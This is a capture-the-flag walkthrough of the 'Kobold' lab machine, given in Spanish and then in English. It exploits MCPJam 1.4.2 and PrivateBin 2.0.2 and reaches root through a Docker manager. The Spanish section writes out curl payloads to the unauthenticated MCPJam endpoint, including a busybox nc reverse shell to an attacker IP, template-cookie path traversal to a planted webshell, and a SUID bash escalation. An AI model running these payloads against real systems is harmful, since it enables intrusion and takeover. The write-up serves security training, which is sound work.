Resumen de Explotación

Resumen del proceso: La máquina objetivo exponía varios servicios: un servidor nginx en los puertos 80/443 que redirigía a kobold.htb, y un servicio Arcane (gestor de contenedores Docker similar a Portainer) en el puerto 3552. Mediante fuzzing de virtual hosts se descubrieron dos subdominios adicionales: mcp.kobold.htb ejecutando MCPJam 1.4.2 y bin.kobold.htb ejecutando PrivateBin 2.0.2.

El acceso inicial se consiguió explotando el CVE-2026-23744 en MCPJam 1.4.2, donde el endpoint /api/mcp/connect carecía de autenticación y permitía ejecución de comandos arbitrarios, obteniendo una shell como el usuario ben.

Para el movimiento lateral, se aprovechó una vulnerabilidad de LFI en PrivateBin (CVE-2025-64714) que, combinada con la capacidad de escribir archivos en el directorio /privatebin-data/data/ compartido con el contenedor Docker, permitió obtener RCE dentro del contenedor de PrivateBin. Desde allí se extrajeron credenciales del fichero de configuración /srv/cfg/conf.php que dieron acceso al panel de Arcane.

Finalmente, la escalada a root se realizó creando un volumen en Arcane que mapeaba la raíz del host (/) y montándolo en un nuevo contenedor. Desde dentro del contenedor privilegiado se asignó el bit SUID a /bin/bash del host, permitiendo obtener una shell como root.

Tecnologías/Exploits: MCPJam RCE sin autenticación (CVE-2026-23744), PrivateBin LFI mediante cookie template (CVE-2025-64714), escalada de privilegios mediante Arcane Docker manager con montaje de volúmenes del host.

Enumeración de Servicios

Arcane - Puerto 3552

En el puerto 3552 se encuentra un servicio llamado Arcane, que es un gestor de contenedores Docker similar a Portainer:

En el footer se indica la versión 1.13.0. Busco vulnerabilidades y encuentro un RCE reciente, pero está parcheado precisamente en esta versión: https://dbugs.ptsecurity.com/vulnerability/PT-2026-3097. De momento descarto esta vía.

PrivateBin - bin.kobold.htb

En bin.kobold.htb se ejecuta PrivateBin versión 2.0.2, un software similar al mítico Pastebin que permite compartir texto de forma temporal y cifrada.

Para PrivateBin encuentro una vulnerabilidad de LFI que afecta a esta versión: CVE-2025-64714. La vulnerabilidad permite incluir archivos PHP arbitrarios si templateselection está habilitado en la configuración, ya que el servidor confía en la cookie template y la utiliza para incluir el fichero PHP referenciado.

"If templateselection is enabled in the configuration, the server trusts the template cookie and includes the referenced PHP file. An attacker can read sensitive data or, if they manage to drop a PHP file elsewhere, gain remote code execution."

En la página oficial de PrivateBin se detallan los pasos de reproducción: https://privatebin.info/reports/vulnerability-2025-11-12-templates.html

Los pasos son sencillos: enviar una petición con una cookie template maliciosa como template=../cfg/conf, donde la ruta relativa apunte a un archivo PHP (sin extensión). Se indica que no es posible acceder a otros archivos PHP de PrivateBin ya que da error 500, pero quizá se podría acceder a otros scripts PHP del sistema. Esto es interesante, pero antes de tirar por este camino investigo el servicio MCPJam.

MCPJam - mcp.kobold.htb

En mcp.kobold.htb se ejecuta MCPJam versión 1.4.2. MCPJam es un software para configurar servidores MCP (Model Context Protocol) que se utilizan con LLMs para potenciar su efectividad dándoles contexto adicional concreto, por ejemplo de algún tipo de tecnología específica.

Para MCPJam encuentro una vulnerabilidad reciente de RCE que afecta exactamente a la versión 1.4.2: CVE-2026-23744.

El problema es que el endpoint /api/mcp/connect no tiene ningún tipo de autenticación y permite ejecutar comandos arbitrarios. Además, hasta esta versión, el servicio se exponía por defecto en todas las interfaces de red (0.0.0.0), lo que significa que cualquier dispositivo en la red tiene RCE sobre una máquina que hostee este servicio.

Encuentro una PoC sencilla en este advisory: https://github.com/advisories/GHSA-232v-j27c-5pp6

Acceso Inicial - Explotando MCPJam (CVE-2026-23744)

Siguiendo la PoC, primero confirmo la ejecución remota de código enviando un curl a mi servidor:

curl https://mcp.kobold.htb/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data '{"serverConfig":{"command":"curl","args":["10.10.14.129"],"env":{}},"serverId":"mytest"}' -k

La respuesta del servidor indica un error de conexión MCP (ya que curl no es un servidor MCP válido), pero en mi servidor HTTP recibo la petición, confirmando el RCE:

python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.14.176 - - "GET / HTTP/1.1" 200 -

Ahora envío el payload con una reverse shell usando busybox nc:

curl https://mcp.kobold.htb/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data '{"serverConfig":{"command":"busybox","args":["nc", "10.10.14.129", "443", "-e", "sh"],"env":{}},"serverId":"mytest"}' -k

Consigo acceso como el usuario ben y obtengo la primera flag.

Movimiento Lateral - PrivateBin LFI a RCE (CVE-2025-64714)

Recupero la vulnerabilidad de LFI que encontré antes en PrivateBin. Ahora que tengo acceso al sistema de archivos, pruebo a crear un archivo shell.php con una webshell en /tmp y /dev/shm, e intento acceder modificando el contenido de la cookie template como indica la PoC, pero no funciona.

Esto es extraño, ya que cualquier usuario debería tener acceso a esos directorios. Lo que se me ocurre es que PrivateBin esté corriendo en un contenedor Docker (ya que sé que Docker existe en la máquina), y que algunos ficheros bajo /privatebin-data se estén sincronizando con los contenidos del contenedor mediante un volumen compartido.

Si mi suposición es correcta, puedo colocar la webshell en /privatebin-data/data/ y luego indicar ese archivo usando el valor ../data/shell en la cookie template. Pruebo a hacerlo y efectivamente, consigo una webshell funcional:

Escalada de Privilegios - Arcane Docker Manager

A partir de aquí la escalada de privilegios es clara: tener acceso a un gestor de contenedores Docker con la capacidad de crear volúmenes y contenedores equivale a tener acceso root en el host. La estrategia es:

  1. Crear un volumen que mapee el contenido completo del host en el contenedor
  2. Crear un contenedor con una imagen base existente, root como usuario por defecto, y que use ese volumen
  3. Desde dentro del contenedor, asignar el bit SUID a la bash del host para escalar a root

Ahora, desde dentro del contenedor puedo ver el sistema de archivos completo del host:

total 100K
drwxr-xr-x  22 root root 4.0K Mar 16 20:57 .
drwxr-xr-x   1 root root 4.0K Mar 22 22:28 ..
drwxr-xr-x   3 root root 4.0K Mar 16 20:57 app
lrwxrwxrwx   1 root root    7 Apr 22  2024 bin -> usr/bin
drwxr-xr-x   2 root root 4.0K Feb 21  2025 boot
dr-xr-xr-x   2 root root 4.0K Mar 15 21:23 cdrom

Simplemente le añado el bit SUID a la bash del sistema host:

/var/www # chmod u+s /xd/bin/bash

De vuelta como el usuario ben, ejecuto una bash privilegiada y consigo acceso como root:

ben@kobold:/privatebin-data/data$ bash -p
bash-5.2# whoami
root

Con esto obtengo la flag de root y completo la máquina.

Exploitation Summary

Exploitation process: The target machine exposed several services: an nginx server on ports 80/443 redirecting to kobold.htb, and an Arcane service (Docker container manager similar to Portainer) on port 3552. Through virtual host fuzzing, two additional subdomains were discovered: mcp.kobold.htb running MCPJam 1.4.2 and bin.kobold.htb running PrivateBin 2.0.2.

Initial access was achieved by exploiting CVE-2026-23744 in MCPJam 1.4.2, where the /api/mcp/connect endpoint lacked authentication and allowed arbitrary command execution, obtaining a shell as the ben user.

For lateral movement, a PrivateBin LFI vulnerability (CVE-2025-64714) was leveraged. Combined with the ability to write files to the /privatebin-data/data/ directory shared with the Docker container, this allowed achieving RCE inside the PrivateBin container. From there, credentials were extracted from the configuration file at /srv/cfg/conf.php, which granted access to the Arcane panel.

Finally, privilege escalation to root was accomplished by creating a volume in Arcane that mapped the host's root filesystem (/) and mounting it in a new container. From inside the privileged container, the SUID bit was set on the host's /bin/bash, enabling a root shell.

Technologies/Exploits: MCPJam unauthenticated RCE (CVE-2026-23744), PrivateBin LFI via template cookie (CVE-2025-64714), privilege escalation via Arcane Docker manager with host volume mounting.

Service Enumeration

Arcane - Port 3552

Port 3552 hosts a service called Arcane, which is a Docker container manager similar to Portainer:

The footer indicates version 1.13.0. I search for vulnerabilities and find a recent RCE, but it's patched in precisely this version: https://dbugs.ptsecurity.com/vulnerability/PT-2026-3097. I discard this path for now.

PrivateBin - bin.kobold.htb

bin.kobold.htb runs PrivateBin version 2.0.2, a software similar to the classic Pastebin that allows sharing text in a temporary and encrypted manner.

For PrivateBin, I find an LFI vulnerability affecting this version: CVE-2025-64714. The vulnerability allows including arbitrary PHP files if templateselection is enabled in the configuration, since the server trusts the template cookie and uses it to include the referenced PHP file.

"If templateselection is enabled in the configuration, the server trusts the template cookie and includes the referenced PHP file. An attacker can read sensitive data or, if they manage to drop a PHP file elsewhere, gain remote code execution."

The official PrivateBin page details the reproduction steps: https://privatebin.info/reports/vulnerability-2025-11-12-templates.html

The steps are straightforward: send a request with a malicious template cookie like template=../cfg/conf, where the relative path points to a PHP file (without its extension). It's noted that accessing other PrivateBin PHP files results in a 500 error, but it might be possible to access other PHP scripts on the system. This is interesting, but before pursuing this path I investigate the MCPJam service.

MCPJam - mcp.kobold.htb

mcp.kobold.htb runs MCPJam version 1.4.2. MCPJam is a software for configuring MCP (Model Context Protocol) servers used with LLMs to enhance their effectiveness by providing specific additional context, for example about a particular technology.

For MCPJam I find a recent RCE vulnerability affecting exactly version 1.4.2: CVE-2026-23744.

The issue is that the /api/mcp/connect endpoint has no authentication whatsoever and allows arbitrary command execution. Furthermore, up to this version, the service was exposed by default on all network interfaces (0.0.0.0), meaning any device on the network has RCE on a machine hosting this service.

I find a simple PoC in this advisory: https://github.com/advisories/GHSA-232v-j27c-5pp6

Initial Access - Exploiting MCPJam (CVE-2026-23744)

Following the PoC, I first confirm remote code execution by sending a curl request to my server:

Lateral Movement - PrivateBin LFI to RCE (CVE-2025-64714)

I revisit the PrivateBin LFI vulnerability I found earlier. Now that I have filesystem access, I try creating a shell.php webshell file in /tmp and /dev/shm, then attempt to access it by modifying the template cookie value as the PoC indicates, but it doesn't work.

This is strange since any user should have global access to those directories. What occurs to me is that PrivateBin is running inside a Docker container (since I know Docker exists on the machine), and some files under /privatebin-data are being synced with the container's contents through a shared volume.

If my assumption is correct, I can place the webshell in /privatebin-data/data/ and then reference that file using the value ../data/shell in the template cookie. I try this and indeed, I now have a working webshell:

Through this webshell I send a reverse shell and access the container, landing in /var/www. I search for the configuration file with find:

Inside this configuration file I find credentials:

I try the credentials for system users but they don't work. However, they do work for the Arcane service on port 3552.

Privilege Escalation - Arcane Docker Manager

From here the privilege escalation path is clear: having access to a Docker container manager with the ability to create volumes and containers is equivalent to having root access on the host. The strategy is:

  1. Create a volume that maps the entire host content into the container
  2. Create a container with an existing base image, root as the default user, and using that volume
  3. From inside the container, set the SUID bit on the host's bash to escalate to root

With this I obtain the root flag and complete the machine.
